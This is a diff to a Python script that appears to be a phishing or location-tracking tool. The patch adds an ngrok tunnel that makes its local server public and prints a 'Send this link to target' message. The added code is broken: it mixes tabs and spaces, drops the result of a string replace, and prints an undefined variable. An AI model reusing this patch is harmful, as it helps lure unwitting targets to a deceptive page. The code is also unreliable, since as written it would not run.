@@ -24,6 +24,7 @@ else:
 	pass
 
 import os
+from pyngrok import ngrok
 import csv
 import sys
 import time
@@ -50,6 +51,10 @@ result = ''
 version = '1.2.5'
 
 def banner():
+        if os.name == 'nt':
+            os.system('cls')
+        else:
+            os.system('clear')
 	print (G +
 	r'''
                         __
@@ -81,10 +86,16 @@ def ver_check():
 		print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
 
 def tunnel_select():
+        global port
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
 		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+        elif tunnel_mode == 'ngrok':
+                print(G + '[+]' + C + ' Starting Ngrok session...' + W + '\n')
+                ngroklink = ngrok.connect(port).public_url
+                ngroklink.replace('http', 'https')
+                print(G + '[+]' + C + ' Send this link to target: ' + R + str(public_url) + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
@@ -362,9 +373,10 @@ def Quit():
 try:
 	banner()
 	ver_check()
-	tunnel_select()
+	#tunnel_select()
 	template_select()
 	server()
+        tunnel_select()
 	wait()
 	main()
 
